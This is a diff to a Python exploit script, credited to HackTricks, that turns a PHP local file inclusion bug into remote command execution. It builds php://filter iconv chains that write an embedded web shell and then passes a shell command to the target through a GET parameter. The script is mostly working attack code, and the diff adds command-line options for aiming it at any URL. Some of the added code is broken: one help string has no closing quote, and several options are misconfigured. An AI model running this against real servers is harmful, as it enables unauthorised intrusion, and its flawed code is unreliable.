@@ -1,13 +1,21 @@
 #from https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
 import requests
+import argparse 
 
-url = "http://localhost/index.php"
-file_to_use = "php://temp"  #possible alternative files: /etc/passwd    
-command = "id"       
+example_text = "python3 lfi2rce_via_php_filters.py http://localhost.index.php -p file -c pwd"
+parser = argparse.ArgumentParser(description="LFI2RCE using PHP filters",epilog=example_text)
+parser.add_argument("url", help="Vulnerable URL: example http://localhost/index.php", type=str)
+parser.add_argument("-p", "--parameter",default="page", action="store_true", help="Vulnerable parameter")  
+parser.add_argument("-f","--file",default="php://temp", action="store_true", help="File to use")
+parser.add_argument("-c","--command", default="id", action="store_true", help="Command to execute)
+  
+args = parser.parse_args() 
+print("Triggering LFI at {}?{} to execute {} using {}".format(args.url, args.parameter, args.command, args.file))
 
 #<?=`$_GET[0]`;;?>
 base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"
 
+#Extra conversions included just in case (if the base64 payload needs to be changed) 
 conversions = {
     '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
     '1': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.OSF1002035D.EUC-KR|convert.iconv.MAC-CYRILLIC.T.61-8BIT|convert.iconv.1046.CSIBM864|convert.iconv.OSF1002035E.UCS-4BE|convert.iconv.EBCDIC-INT1.IBM943',
@@ -93,12 +101,17 @@ for c in base64_payload[::-1]:
 
 filters += "convert.base64-decode"
 
-final_payload = f"php://filter/{filters}/resource={file_to_use}"
+final_payload = f"php://filter/{filters}/resource={args.file}"
 
-r = requests.get(url, params={
-    "0": command,
+'''  
+proxies = {
+  "http": "socks5://127.0.0.1:1080",
+}
+'''
+r = requests.get(args.url, params={
+    "0": args.command,
     "action": "include",
-    "page": final_payload           #vulnerable parameter: ie http://site.org/nav.php?page=index.html    
+    args.parameter: final_payload              
 })
 
 print(r)
